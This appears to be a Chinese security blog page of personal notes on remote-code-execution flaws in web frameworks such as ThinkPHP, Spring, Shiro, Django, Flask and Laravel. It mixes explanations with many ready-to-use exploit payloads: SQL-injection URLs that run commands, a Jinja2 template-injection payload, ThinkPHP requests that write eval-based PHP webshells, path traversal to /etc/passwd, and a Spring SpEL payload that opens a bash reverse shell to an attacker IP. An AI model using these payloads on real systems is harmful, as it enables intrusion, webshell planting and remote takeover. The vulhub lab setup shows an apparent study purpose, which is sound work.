<!DOCTYPE html>
<html lang="zh-CN">

  
<head>
  <meta charset="utf-8">
  <meta name="author" content="johnscott" />
  
  
  
  <title>46其他漏洞 | JohnScott2046的博客</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="网络安全,网络安全," />
  

  <script>
    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
  </script>

  
    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
  

  

  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/icon/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  
<script src="/js/util.js"></script>
<script src="/js/valine.min.js"></script>


  

  
    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
  

  
    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
  
  
  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
  
  
    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
  

<meta name="generator" content="Hexo 5.1.1"></head>

  <body>
    <meta name="baidu-site-verification" content="code-gxYIK5UWjA" />
    

    <div id="app">

      <div class="header-wrap">
  <header>
    <div class="site-brand">
      <div class="site-title">
        <a href="/">JohnScott2046</a>
      </div>
    </div>
    <nav class="site-navigation">
      <ul class="nav-menu">
      
        <li class="nav-item" data-path="/">
          
            <a 
              href="/"
              target="_self"
            >
              主页
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/archives/">
          
            <a 
              href="/archives/"
              target="_self"
            >
              归档
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/categories/">
          
            <a 
              href="/categories/"
              target="_self"
            >
              分类
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/tags/">
          
            <a 
              href="/tags/"
              target="_self"
            >
              标签
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/friends/">
          
            <a 
              href="/friends/"
              target="_self"
            >
              友链
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/about/">
          
            <a 
              href="/about/"
              target="_self"
            >
              关于
            </a>
          
        </li>
      
        <li class="nav-item" data-path="">
          
            <a href="javascript:void(0);" v-else>联系我</a>
            <ul class="nav-menu--dropdown">
              
                <li>
                  <a 
                    href="https://github.com/liuxue5213" 
                    target="_blank"
                  >
                    Github
                  </a>
                </li>
              
                <li>
                  <a 
                    href="https://www.zhihu.com/people/liuxue5213" 
                    target="_blank"
                  >
                    知乎
                  </a>
                </li>
              
                <li>
                  <a 
                    href="http://weibo.com/liuxue5213" 
                    target="_blank"
                  >
                    微博
                  </a>
                </li>
              
                <li>
                  <a 
                    href="https://www.douban.com/people/liuxue5213" 
                    target="_blank"
                  >
                    豆瓣
                  </a>
                </li>
              
                <li>
                  <a 
                    href="/linkedin.com/in/liuxue5213" 
                    target="_blank"
                  >
                    linkedin
                  </a>
                </li>
              
            </ul>
          
        </li>
      
      </ul>
    </nav>
    <i class="iconfont icon-menu"></i>
  </header>
</div>

<script>
  let links = document.querySelectorAll('.nav-item');
  for(let link of links){
    let childrenLink = link.querySelector('ul');
    link.addEventListener('mouseenter', () => {
      if(childrenLink) {
        childrenLink.className = "nav-menu--dropdown active";
      }
    })
    link.addEventListener('mouseleave', () => {
      if(childrenLink) {
        childrenLink.className = "nav-menu--dropdown";
      }
    })
  }
  let rootRealPath = getRealPath(window.location.pathname, true);
  for(let link of links) {
    let linkPath = link.getAttribute("data-path");
    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
      link.className = "nav-item hover";
    }
  }

  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
    iconMenuClicked = false;
  let navDOM = document.querySelector("nav.site-navigation");
  iconMenu.addEventListener("click", () => {
    iconMenuClicked 
      ? navDOM.className = "site-navigation active"
      : navDOM.className = "site-navigation";
    iconMenuClicked = !iconMenuClicked;
  })
</script>

      








<div class="container post-index">

  

<div class="post">
  <h1 class="article-title">
    <span>46其他漏洞</span>
  </h1>
  <div class="article-top-meta">
    <span>
      发布 : 
      2021-11-19
    </span>
    
      <span>
        分类 : 
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
            网络安全
          </a>
      </span>
    
    
      <span>
        浏览 : <span class="article-timer" data-identity="46其他漏洞"></span>
      </span>
    
  </div>

  

  <div class="article-content">
    <div class="markdown-body">
      <p>网络安全(一)其他漏洞</p>
<h2 id="常见框架RCE总结"><a href="#常见框架RCE总结" class="headerlink" title="常见框架RCE总结"></a>常见框架RCE总结</h2><p>中间件及框架列表：</p>
<p>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p>
<p>1、开发框架-PHP-Laravel-Thinkphp</p>
<p>2、开发框架-Javaweb-St2-Spring</p>
<p>3、开发框架-Python-django-Flask</p>
<p>4、开发框架-Javascript-Node.js-JQuery</p>
<p>5、其他框架-Java-Apache Shiro&amp;Apache Sorl</p>
<p>常见语言开发框架：</p>
<p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等</p>
<p>JAVA：Spring MyBatis Hibernate Struts2 Springboot等</p>
<p>Python：Django Flask Bottle Turbobars Tornado Web2py等</p>
<p>Javascript：Vue.js Node.js Bootstrap JQuery Angular等</p>
<h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><p>CVE-2021-3129 RCE</p>
<p>Laravel &lt;= 8.4.2</p>
<p><a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a></p>
<p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
<h3 id="Thinkphp-3-X-RCE-5-X-RCE"><a href="#Thinkphp-3-X-RCE-5-X-RCE" class="headerlink" title="Thinkphp-3.X RCE-5.X RCE"></a>Thinkphp-3.X RCE-5.X RCE</h3><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
<p><a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3">https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3</a></p>
<h3 id="PHPUnit"><a href="#PHPUnit" class="headerlink" title="PHPUnit"></a>PHPUnit</h3><p>eval-stdin.php 远程命令执行漏洞 CVE-2017-9841</p>
<p>/phpunit/src/Util/PHP/eval-stdin.php</p>
<p>POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1<br>Host:<br>Content-Length: 21<br>Accept-Encoding: gzip</p>
<h3 id="JAVA-Spring-amp-Struts2-amp-Shiro"><a href="#JAVA-Spring-amp-Struts2-amp-Shiro" class="headerlink" title="JAVA Spring&amp;Struts2&amp;Shiro"></a>JAVA Spring&amp;Struts2&amp;Shiro</h3><p>S2-062 CVE-2021-31805</p>
<p><a href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p>
<h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><p>SpringBoot 相关漏洞学习资料，利用方法和技巧合集</p>
<p><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
<p>SpringBoot</p>
<p><a href="https://github.com/0x727/SpringBootExploit">https://github.com/0x727/SpringBootExploit</a></p>
<p><a href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></p>
<p>Spring-cloud-function</p>
<p><a href="https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE">https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE</a></p>
<p>Spring_Cloud_Gateway</p>
<p><a href="https://github.com/An0th3r/CVE-2022-22947-exp">https://github.com/An0th3r/CVE-2022-22947-exp</a></p>
<h3 id="Apache-Shiro"><a href="#Apache-Shiro" class="headerlink" title="Apache Shiro"></a>Apache Shiro</h3><p>判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段</p>
<p>漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=shiro">https://avd.aliyun.com/search?q=shiro</a></p>
<p>Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞  CVE-2016-4483<br>Apache Shiro &lt; 1.3.2 验证绕过漏洞 CVE-2016-2807<br>Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 CVE-2019-12442<br>Apache Shiro &lt; 1.5.2 验证绕过漏洞 CVE-2020-1957<br>Apache Shiro &lt; 1.5.3 验证绕过漏洞 CVE-2020-11989<br>Apahce Shiro &lt; 1.6.0 验证绕过漏洞 CVE-2020-13933<br>Apahce Shiro &lt; 1.7.1 权限绕过漏洞 CVE-2020-17523</p>
<p>CVE_2016_4437 Shiro-550+Shiro-721</p>
<p>CVE-2020-11989<br>Poc： /admin/%20<br>影响范围：Apache Shiro &lt; 1.7.1<br><a href="https://github.com/jweny/shiro-cve-2020-17523">https://github.com/jweny/shiro-cve-2020-17523</a></p>
<p>CVE-2020-1957<br>Poc： /xxx/..;/admin/<br>影响范围：Apache Shiro &lt; 1.5.3</p>
<h3 id="Apache-Solr"><a href="#Apache-Solr" class="headerlink" title="Apache Solr"></a>Apache Solr</h3><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2017-12629">https://github.com/Imanfeng/Apache-Solr-RCE#cve-2017-12629</a></p>
<p>CVE-2019-0193<br>CVE-2019-0192<br>CVE-2019-17558<br>CVE-2017-12629<br>CVE-2019-12409<br>CVE-2020-13957<br>CVE-2018-8026<br>CVE-2021-27905 Apache Solr 文件读取&amp;SSRF</p>
<p><a href="https://github.com/murataydemir/CVE-2021-27905">https://github.com/murataydemir/CVE-2021-27905</a></p>
<h3 id="Python-Django-amp-Flask-amp-MotionEye"><a href="#Python-Django-amp-Flask-amp-MotionEye" class="headerlink" title="Python Django&amp;Flask&amp;MotionEye"></a>Python Django&amp;Flask&amp;MotionEye</h3><p>CVE_2019_14234</p>
<p>单引号已注入成功，SQL语句报错：<br>/admin/vuln/collection/?detail__a%27b=123</p>
<p>创建cmd_exec：<br>/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)–%20</p>
<p>调用cmd_exec执行命令：<br>/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27–%20</p>
<p>CVE-2020-7471<br><a href="https://github.com/huzaifakhan771/CVE-2020-7471-Django">https://github.com/huzaifakhan771/CVE-2020-7471-Django</a></p>
<p>CVE-2021-35042<br>目录：<br>/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23<br>版本：<br>/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23</p>
<p>数据库名：<br>/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23</p>
<h3 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h3><p>Flask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug ，模板引擎则使用Jinja2</p>
<p>?name=%7B%25%20for%20c%20in%20%5B%5D.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()%20%25%7D%0A%7B%25%20if%20c.<strong>name</strong>%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.<strong>init</strong>.<strong>globals</strong>.values()%20%25%7D%0A%20%20%7B%25%20if%20b.<strong>class</strong>%20%3D%3D%20%7B%7D.<strong>class</strong>%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</p>
<h3 id="MotionEye"><a href="#MotionEye" class="headerlink" title="MotionEye"></a>MotionEye</h3><p>信息泄露漏洞 CVE-2022-25568</p>
<p>MotionEye &lt;= 0.42.1</p>
<p>/config/list</p>
<h3 id="JavaScript-Jquery-amp-Node"><a href="#JavaScript-Jquery-amp-Node" class="headerlink" title="JavaScript Jquery&amp;Node"></a>JavaScript Jquery&amp;Node</h3><p>jQuery Upload File &lt;= 4.0.2 中的任意文件上传<br>curl -F “myfile=@php.php” “url”</p>
<p>XSS payload<br><a href="https://github.com/mahp/jQuery-with-XSS">https://github.com/mahp/jQuery-with-XSS</a></p>
<p>cve_2021_21315<br>Systeminformation &lt;  5.3.1</p>
<p><a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC</a></p>
<p>POC<br>/api/getServices?name[]=$(echo -e ‘ckcsec’ &gt; test.txt)<br>cve_2017_14849</p>
<p>GET：<br>/static/../../../a/../../../../etc/passwd</p>
<h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><h3 id="一、-thinkphp漏洞"><a href="#一、-thinkphp漏洞" class="headerlink" title="一、 thinkphp漏洞"></a>一、 thinkphp漏洞</h3><p>最早诞生于 2006 年初，2007 年元旦正式更名为 ThinkPHP，并且遵循 Apache2 开源协议发布。ThinkPHP 从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进</p>
<p>ThinkPHP 能够解决应用开发中的大多数需要，因为其自身包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件，并且对于跨版本、跨平台和跨数据库移植都比较方便。并且每个组件都是精心设计和完善的，应用开发过程仅仅需要关注您的业务逻辑</p>
<p>ThinkPHP 2.x 任意代码执行漏洞<br>ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞</p>
<p>使用 preg_replace 的 /e 模式匹配路由，导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞；</p>
<p>$res = preg_replace(‘@(\w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2”;’, implode($depr,$paths));</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>执行一个正则表达式的搜索和替换 preg_replace<br>preg_replace(<br>  string|array $pattern,<br>  string|array $replacement,<br>  string|array $subject,<br>  int $limit = -1,<br>  int &amp;$count = null<br>): string|array|null</p>
<p>搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换</p>
<p>pattern 要搜索的模式。可以使一个字符串或字符串数组<br>  i 如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配<br>  m 如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响<br>  s 如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个修饰符，点号不匹配换行符<br>  x 如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。注意：这仅用于数据字符。空白字符 还是不能在模式的特殊字符序列中出现，比如序列<br>  A 如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索<br>  D 如果这个修饰符被设置，模式中的元字符美元符号仅仅匹配目标字符串的末尾。如果这个修饰符 没有设置，当字符串以一个换行符结尾时， 美元符号还会匹配该换行符(但不会匹配之前的任何换行符)。 如果设置了修饰符m，这个修饰符被忽略<br>  S 当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)<br>  U 这个修饰符逆转了量词的”贪婪”模式。 使量词默认为非贪婪的，通过量词后紧跟? 的方式可以使其成为贪婪的<br>  X 模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性<br>  j 内部选项设置(?J)修改本地的PCRE_DUPNAMES选项<br>  u 模式和目标字符串都被认为是 UTF-8 的。 无效的目标字符串会导致 preg_* 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误</p>
<p>replacement 用于替换的字符串或字符串数组<br>  如果是字符串，并且 pattern 是一个数组，那么所有的模式都使用这个字符串进行替换。<br>  如果 pattern 和 replacement 都是数组，每个 pattern 使用 replacement 中对应的元素进行替换。<br>  如果 replacement 中的元素比 pattern 中的少，多出来的 pattern 使用空字符串进行替换</p>
<p>  当使用被弃用的 e 修饰符时, 这个函数会转义一些字符 (即：’、”、 \ 和 NULL) 然后进行后向引用替换。</p>
<p>  当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误 (比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。</p>
<p>  确保符合 PHP 的字符串语法，并且符合 eval 语法。因为在完成替换后，引擎会将结果字符串作为 PHP 代码使用 eval 方式进行评估并将返回值作为最终参与替换的字符串</p>
<p>subject 要进行搜索和替换的字符串或字符串数组<br>  如果 subject 是一个数组，搜索和替换回在 subject 的每一个元素上进行, 并且返回值也会是一个数组</p>
<p>limit 每个模式在每个 subject 上进行替换的最大次数。默认是 -1（无限）  </p>
<p>count 如果指定，将会被填充为完成的替换次数</p>
<p>返回值<br>如果 subject 是一个数组，preg_replace() 返回一个数组，其他情况下返回一个字符串。<br>如果匹配被查找到，替换后的 subject 被返回，其他情况下返回没有改变的 subject。<br>如果发生错误，返回 null。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &#39;123aaa&#39;;</span><br><span class="line">$b &#x3D; preg_replace(&#39;&#x2F;\d&#x2F;e&#39;, &quot;print(&#39;hello!&#39;)&quot;, $a);</span><br><span class="line"></span><br><span class="line">hello!hello!hello!111aaa</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &#39;aaa&#39;;</span><br><span class="line">$b &#x3D; preg_replace(&#39;&#x2F;\d&#x2F;e&#39;, &quot;print(&#39;hello world!&#39;);&quot;, $a);</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$arr &#x3D; array();</span><br><span class="line">$str &#x3D; &#39;a&#x2F;b&#x2F;c&#x2F;d&#x2F;e&#x2F;f&#x2F;g&#39;;</span><br><span class="line"></span><br><span class="line">preg_replace(&quot;&#x2F;(\w+)\&#x2F;([^\&#x2F;])&#x2F;e&quot;, &#39;$arr[&quot;\1&quot;]&#x3D;&quot;\2&quot;&#39;, $str);</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">  &#39;a&#39; &#x3D;&gt; &#39;b&#39;,</span><br><span class="line">  &#39;c&#39; &#x3D;&gt; &#39;d&#39;,</span><br><span class="line">  &#39;e&#39; &#x3D;&gt; &#39;f&#39;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>


<h4 id="環境搭建"><a href="#環境搭建" class="headerlink" title="環境搭建"></a>環境搭建</h4><p>cd vulhub/thinkphp/2-rce<br>docker-compose up -d<br>docker ps -a</p>
<p>ThinkPHP\App\ThinkPHP\Lib\Think\Util\Dispatcher.class</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=a/b/$%7Bphpinfo()%7D">http://192.168.1.230:8080/index.php?s=a/b/${phpinfo()}</a> 發生錯誤</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=a/b/c/$%7Bphpinfo()%7D">http://192.168.1.230:8080/index.php?s=a/b/c/${phpinfo()}</a><br><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=a/b/c/$%7Bphpinfo()%7D/e/f">http://192.168.1.230:8080/index.php?s=a/b/c/${phpinfo()}/e/f</a></p>
<p>主入口文件默认访问 index 控制器<br>所有的控制器默认执行 index 动作<br>URL映射控制器，static public function dispatch()，也就是 URL 访问的路径是映射到对应的控制器下</p>
<p><a target="_blank" rel="noopener" href="http://servername/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC...]">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</a></p>
<p>可以写入木马<br><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=/index/index/nameaaaaae/$%7Bphpinfo()%7D">http://192.168.1.230:8080/index.php?s=/index/index/nameaaaaae/${phpinfo()}</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=/index/index/nameaaaaae/$%7Beval($_REQUEST%5B10%5D)%7D&amp;&amp;10=phpinfo()">http://192.168.1.230:8080/index.php?s=/index/index/nameaaaaae/${eval($_REQUEST[10])}&amp;&amp;10=phpinfo()</a>;</p>
<h3 id="二、-thinkphp5路由漏洞"><a href="#二、-thinkphp5路由漏洞" class="headerlink" title="二、 thinkphp5路由漏洞"></a>二、 thinkphp5路由漏洞</h3><p>cd vulhub/thinkphp/5-rce</p>
<p>默认情况下 ThinkPHP 没有开启强制路由选项，默认开启路由兼容模式；</p>
<p>application/config.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;route_config_file&#39; &#x3D;&gt; [&#39;route&#39;],  &#x2F;&#x2F;路由配置文件（支持配置多个）</span><br><span class="line">&#39;url_route_must&#39; &#x3D;&gt; false,  &#x2F;&#x2F;是否强制使用路由</span><br></pre></td></tr></table></figure>

<p>config\app.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;var_pathinfo&#39; &#x3D;&gt; &#39;a&#39;,  &#x2F;&#x2F;用于兼容模式变量名</span><br></pre></td></tr></table></figure>

<p>可以使用路由兼容模式s参数，对框架控制器名进行检测，所有用户的参数都会经过 Request 类的 input 方法处理，该方法会调用 filterValue 方法，而 filterValue 方法中调用了 call_user_func()（把第一个参数作作为回调函数调用，其余参数是回调函数的参数），那么就尝试来利用这个方法</p>
<p><a target="_blank" rel="noopener" href="http://servername/index.php?s=/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/">http://serverName/index.php?s=/模块/控制器/操作/</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=index/think%5Cconfig/get&amp;name=database.username">http://192.168.1.230:8080/index.php?s=index/think\config/get&amp;name=database.username</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call">http://192.168.1.230:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call</a>_ user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=<?php eval($_REQUEST[8]);?></p>
<h3 id="三、-thinkphp5远程执行代码漏洞"><a href="#三、-thinkphp5远程执行代码漏洞" class="headerlink" title="三、 thinkphp5远程执行代码漏洞"></a>三、 thinkphp5远程执行代码漏洞</h3><p>在实现框架中的核心类 Requests 的 method 实现了表单请求类型伪装，默认为 $_POST[‘_method’]变量，却没有对 $_POST[‘_method’] 属性进行严格校验，可以通过变量覆盖掉 Requets 类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果</p>
<p>cd vulhub/thinkphp/5.0.23-rce</p>
<p><a target="_blank" rel="noopener" href="http://localhost/public/index.php?s=captcha">http://localhost/public/index.php?s=captcha</a></p>
<p>post<br>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo ‘<?php eval($_REQUEST[2046]);?>‘ &gt; 2046.php</p>
<h3 id="四、-SQL注入漏洞和敏感信息泄露漏洞"><a href="#四、-SQL注入漏洞和敏感信息泄露漏洞" class="headerlink" title="四、 SQL注入漏洞和敏感信息泄露漏洞"></a>四、 SQL注入漏洞和敏感信息泄露漏洞</h3><p>传入的某参数在绑定编译指令的时候没有安全处理，预编译的时候导致 SQL 异常报错</p>
<p>thinkphp5 默认开启 debug 模式，在漏洞环境下构造错误的 SQL 语法会泄漏数据库账户和密码</p>
<p>漏洞版本 ThinkPHP &lt; 5.1.23，关键一点是需要开启 debug 模式</p>
<p>index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.230/index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1">http://192.168.1.230/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</a></p>
<h3 id="五、-Spring漏洞"><a href="#五、-Spring漏洞" class="headerlink" title="五、 Spring漏洞"></a>五、 Spring漏洞</h3><p>Spring 是一个开源框架，它由 Rod Johnson 创建。它是为了解决企业应用开发的复杂性而创建的。<br>Spring 使用基本的 JavaBean 来完成以前只可能由 EJB 完成的事情。然而，Spring 的用途不仅限于服务器端的开发。</p>
<h4 id="Spring漏洞"><a href="#Spring漏洞" class="headerlink" title="Spring漏洞"></a>Spring漏洞</h4><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。</p>
<p>在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个 SpEL表达式 注入漏洞，最终造成任意命令执行</p>
<p>SpEL表达式注入<br>SpEL(Spring Expression Language)，即Spring表达式语言。它是一种类似JSP的EL表达式、但又比后者更为强大有用的表达式语言</p>
<p>为什么要用SpEL<br>因为它可以在spring容器内实时查询和操作数据，尤其是操作 List 列表型、Array 数组型数据。所以使用 SpEL 可以有效缩减代码量</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>cd vluhub/spring/CVE-2017-4971</p>
<p>访问，输入左边提供的账号密码登录，view hotal</p>
<p>抓包，拼接payload</p>
<p>&amp;_(new+java.lang.ProcessBuilder(“bash”,”-c”,”bash+-i+&gt;%26+/dev/tcp/攻击机IP/端口号+0&gt;%261”)).start()=vulhub</p>
<p>ProcessBuilder 类是 J2SE 1.5 在 java.lang 中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法。在 J2SE 1.5 之前，都是由 Process 类处来实现进程的控制管理。</p>
<p>每个 ProcessBuilder 实例管理一个进程属性集。它的 start() 方法利用这些属性创建一个新的 Process实例。start() 方法可以从同一实例重复调用</p>
<h3 id="六、-ThinkPHP5-RCE-GetSHELL"><a href="#六、-ThinkPHP5-RCE-GetSHELL" class="headerlink" title="六、 ThinkPHP5-RCE-GetSHELL"></a>六、 ThinkPHP5-RCE-GetSHELL</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.230/public/index.php?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=whoami">http://192.168.1.230/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</a></p>
<p>写入一句话</p>
